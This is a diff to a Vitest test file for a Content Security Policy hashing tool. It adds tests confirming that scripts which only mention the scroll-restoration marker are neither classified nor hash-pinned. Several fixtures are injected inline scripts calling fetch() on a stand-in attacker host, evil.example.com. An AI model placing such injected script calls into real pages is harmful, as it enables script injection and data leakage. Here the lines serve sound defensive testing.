@@ -4,6 +4,7 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import {
+  SCROLL_RESTORATION_SCRIPT,
   classifyScript,
   cspHash,
   inlineScripts,
@@ -127,10 +128,20 @@ describe('classifyScript', () => {
     expect(classifyScript({ attrs: '', body: `${readThemeInitScript()}//` })).toBeNull()
   })
 
-  it('classifies the scroll-restoration script by its marker', () => {
+  it('classifies the scroll-restoration script by exact match', () => {
+    expect(SCROLL_RESTORATION_BODY).toBe(SCROLL_RESTORATION_SCRIPT)
     expect(classifyScript({ attrs: '', body: SCROLL_RESTORATION_BODY })).toBe(
       'tsr-scroll-restoration'
     )
+  })
+
+  it('does not classify a script that merely contains the scroll-restoration marker', () => {
+    const marker = 'tsr-scroll-restoration'
+    expect(
+      classifyScript({ attrs: '', body: `fetch('https://evil.example.com/?${marker}')` })
+    ).toBeNull()
+    expect(classifyScript({ attrs: '', body: `${SCROLL_RESTORATION_BODY};fetch('/x')` })).toBeNull()
+    expect(classifyScript({ attrs: '', body: `fetch('/x');${SCROLL_RESTORATION_BODY}` })).toBeNull()
   })
 
   it('classifies the stream barrier by its class or id attribute', () => {
@@ -179,6 +190,14 @@ describe('pinHtml', () => {
     expect(rejected).toHaveLength(1)
     expect(rejected[0].preview).toContain('evil.example.com')
     expect(html.slice(rejected[0].start, rejected[0].end)).toContain('evil.example.com')
+  })
+
+  it('rejects a script that merely mentions the scroll-restoration key, and pins no hash for it', () => {
+    const html = `<head><title>t</title></head><body><script>fetch('https://evil.example.com/?tsr-scroll-restoration')</script></body>`
+    const { rejected, hashes } = pinHtml(html)
+    expect(hashes).toEqual([])
+    expect(rejected).toHaveLength(1)
+    expect(rejected[0].preview).toContain('evil.example.com')
   })
 
   it('pins the real shell head end to end: three hashes, none rejected', () => {
